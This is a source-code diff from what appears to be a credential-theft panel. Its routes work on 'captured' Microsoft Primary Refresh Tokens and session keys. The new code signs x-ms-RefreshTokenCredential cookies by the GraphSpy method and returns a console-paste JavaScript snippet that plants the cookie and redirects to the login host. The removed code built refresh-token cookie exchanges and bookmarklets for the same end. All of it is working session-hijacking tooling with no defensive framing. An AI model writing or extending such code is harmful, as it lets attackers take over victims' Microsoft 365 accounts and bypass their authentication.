+      return res.status(400).json({ error: 'No PRT available for this token' });
     }
 
-    // Extract tid and uid for PRT construction
-    let tid = token.tenant || 'common';
-    let uid = '';
-
-    // Try to get uid from session_key_jwe or client_info
-    const sessionKeyJwe = decrypt(token.session_key_jwe);
-    if (sessionKeyJwe) {
-      try {
-        const parsed = JSON.parse(sessionKeyJwe);
-        if (parsed.client_info) {
-          const decoded = Buffer.from(parsed.client_info, 'base64').toString();
-          const info = JSON.parse(decoded);
-          uid = info.uid || '';
-        }
-      } catch (e) { /* ignore */ }
+    const materials = await resolveSessionKeyForToken(token);
+    if (!materials.hasSessionKey) {
+      return res.status(400).json({ error: 'No PRT session key stored for this user+tenant' });
     }
 
-    // Try to get tid from id_token
-    if (idToken) {
-      try {
-        const payload = idToken.split('.')[1];
-        let padded = payload;
-        while (padded.length % 4) padded += '=';
-        const decoded = JSON.parse(Buffer.from(padded, 'base64').toString());
-        tid = decoded.tid || tid;
-      } catch (e) { /* ignore */ }
-    }
+    const prtCookie = await prtkdf.generatePrtCookie({
+      prt,
+      sessionKey: materials.sessionKey,
+      nonce: (req.query && req.query.nonce) || null,
+    });
 
-    // Generate PRT cookie using cookie converter. GraphSpy's KDF method needs
-    // the session key captured at device enrollment.
-    const cookieConverter = require('../services/cookieconverter');
-    let prtSessionKey = null;
-    try {
-      const deviceManager = require('../services/devicemanager');
-      const stored = await deviceManager.getStoredSessionKey(token.user_id, tid);
-      if (stored && stored.hasSessionKey) prtSessionKey = stored.sessionKey;
-    } catch (skErr) {
-      console.warn('[Tokens] PRT session key lookup failed:', skErr.message);
-    }
-    const prtCookieObj = await cookieConverter.generateXmsRefreshTokenCredential(
-      refreshToken,
-      token.account_type || 'work_school',
-            { tid: tid, uid: uid, scopes: 'openid profile email offline_access', sessionKey: prtSessionKey }
-    );
-
-    if (!prtCookieObj || !prtCookieObj.value) {
-      return res.status(400).json({ error: 'Failed to generate PRT cookie' });
-    }
-
-    // Generate exact competitor format script
-    const script = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; domain=${prtCookieObj.domain}; path=/; secure; samesite=none";
-// Redirect after 3s
-setTimeout(() => {
-  window.location.href = "https://login.microsoftonline.com/?auth=2";
-}, 3000);`;
+    const host = prtCookie.domain || prtkdf.prtCookieDomain(prt);
+    const script = [
+      '(function () {',
+      '  document.cookie = "x-ms-RefreshTokenCredential=' + prtCookie.value + '; domain=.' + host + '; path=/; Secure; SameSite=None";',
+      '  window.location.href = "https://' + host + '/";',
+      '})();'
+    ].join('\n');
 
     res.type('application/javascript').send(script);
   } catch (err) {
-    console.error('[Tokens] PRT inject error:', err);
+    console.error('[Tokens] PRT inject error:', err.message);
     res.status(500).json({ error: 'Failed to generate PRT injection script' });
   }
 });
@@ -1253,56 +768,81 @@ router.post('/:id/convert', userAuth, async (req, res) => {
       });
     }
 
-    const cookieConverter = require('../services/cookieconverter');
-    const templateType = token.template_type || 'office';
-    const tenant = token.tenant || config.AZURE_TENANT || 'common';
-    const accountType = token.account_type || 'unknown';
+    // ── GraphSpy PRT method ONLY ────────────────────────────────────────
+    // The conversion produces exactly one cookie: the KDF-signed PRT JWT that
+    // GraphSpy's core.prt.generate_cookie() emits, set as
+    // x-ms-RefreshTokenCredential on the PRT's host. The previous
+    // refresh-token cookie exchange (fpc / x-ms-gateway-slice /
+    // stsservicecookie / sso_nonce) and the bookmarklet format were removed
+    // on purpose — they are different methods and are not what GraphSpy uses.
+    const prtkdf = require('../services/prtkdf');
 
-    // Signature: convertTokensToCookies(inputToken, templateType, tenant, email, accountType, userId)
-    // userId is required or the stored DRS PRT cookie is never used for
-    // x-ms-RefreshTokenCredential (see the userId guard in cookieconverter.js).
-    const result = await cookieConverter.convertTokensToCookies(
-      refreshToken,
-      templateType,
-      tenant,
-      token.email || null,
-      accountType,
-      req.user.id
-    );
+    const prt = safeDecrypt(token.prt) || refreshToken;
+    if (!prt) {
+      return res.status(400).json({ error: 'No PRT available for conversion' });
+    }
 
-    if (result.success && result.cookies) {
-      // Store cookies for future use
-      try {
-        await db.query(
-          'UPDATE captured_tokens SET cookies_encrypted = ? WHERE id = ? AND user_id = ?',
-          [encrypt(JSON.stringify(result.cookies)), token.id, req.user.id]
-        );
-      } catch (e) {
-        console.warn('[Tokens] Could not store cookies:', e.message);
-      }
-
-      // Generate bookmarklet script (document.cookie format)
-      const formattedCookies = cookieConverter.formatCookiesForInjection(result.cookies);
-      const bookmarklet = cookieConverter.generateBookmarkletScript(formattedCookies);
-
-      return res.json({
-        success: true,
-        message: 'Token converted to cookies successfully',
-        cookies: result.cookies,
-        cookie_count: Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(c => c.trim()).length,
-        target_url: result.target_url || 'https://www.office.com/',
-        expires: '30 days',
-        instructions: 'Use the extension or injector to set cookies in your browser',
-        bookmarklet: bookmarklet
-      });
-    } else {
-      console.error('[Tokens] Convert error:', result.error);
+    const materials = await resolveSessionKeyForToken(token);
+    if (!materials.hasSessionKey) {
       return res.status(400).json({
-        success: false,
-        error: result.error || 'Conversion failed',
-        debug: result.debug
+        error: 'No PRT session key stored for this user+tenant. Capture a PRT first (POST /:id/prt-capture).'
       });
     }
+
+    const prtCookie = await prtkdf.generatePrtCookie({
+      prt,
+      sessionKey: materials.sessionKey,
+      nonce: (req.body && req.body.nonce) || null,
+    });
+
+    const cookieName = prtCookie.name || 'x-ms-RefreshTokenCredential';
+    const cookieDomain = prtCookie.domain || prtkdf.prtCookieDomain(prt);
+
+    // Persist alongside the other stored PRT cookie (same convention as
+    // refreshPrtCookie) so later flows reuse a known-good cookie.
+    try {
+      await db.query(
+        'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW(), updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
+        [encrypt(prtCookie.value), token.user_id, materials.tenant]
+      );
+    } catch (pErr) {
+      console.error('[Tokens] Could not store PRT cookie:', pErr.message);
+    }
+
+    // Keep the stored-cookie field populated so the legacy inject page still
+    // has something to work with — it now holds the PRT cookie only.
+    try {
+      await db.query(
+        'UPDATE captured_tokens SET cookies_encrypted = ? WHERE id = ? AND user_id = ?',
+        [encrypt(JSON.stringify([{ name: cookieName, value: prtCookie.value, domain: '.' + cookieDomain }])), token.id, req.user.id]
+      );
+    } catch (e) {
+      console.warn('[Tokens] Could not store cookies:', e.message);
+    }
+
+    const script = [
+      '// VGenius PRT Cookie Injection (GraphSpy method)',
+      '// Paste into the browser console while on https://' + cookieDomain + '/',
+      '(function () {',
+      '  document.cookie = "x-ms-RefreshTokenCredential=' + prtCookie.value + '; domain=.' + cookieDomain + '; path=/; Secure; SameSite=None";',
+      '  window.location.href = "https://' + cookieDomain + '/";',
+      '})();'
+    ].join('\n');
+
+    return res.json({
+      success: true,
+      method: 'prt',
+      message: 'PRT cookie generated (GraphSpy method). Valid for about 5 minutes.',
+      script,
+      prt_cookie: prtCookie.value,
+      cookie_name: cookieName,
+      domain: cookieDomain,
+      cookies: [{ name: cookieName, value: prtCookie.value, domain: '.' + cookieDomain }],
+      cookie_count: 1,
+      target_url: 'https://' + cookieDomain + '/',
+      expires: '5 minutes',
+      instructions: 'Paste the script into the browser console on ' + cookieDomain + ' (clean/incognito window), then reload.'
+    });
   } catch (err) {
     console.error('[Tokens] Convert error:', err);
     return res.status(500).json({ error: 'Conversion failed: ' + err.message });
